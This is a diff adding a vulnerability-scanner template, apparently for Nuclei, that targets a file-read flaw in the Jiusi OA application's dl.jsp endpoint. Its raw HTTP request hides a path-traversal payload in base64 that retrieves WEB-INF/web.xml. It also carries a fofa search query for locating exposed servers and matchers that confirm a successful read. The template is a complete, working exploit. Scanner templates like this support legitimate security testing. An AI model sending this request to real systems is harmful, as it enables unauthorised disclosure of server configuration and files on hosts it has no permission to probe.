@@ -1,0 +1,31 @@
+id: jiusiOA-dl-jsp-Fileread
+
+info:
+  name: jiusiOA-dl-jsp-Fileread
+  author: lengmo
+  severity: high
+  description: jiusiOA-dl-jsp-Fileread
+  tags: fileread
+  metadata:
+    fofa-query: body="/jsoa/login.jsp"
+
+http:
+  - raw:
+      - |
+        POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0" encoding="UTF-8"?>'
+        
+      - type: status
+        status: 
+          - 200
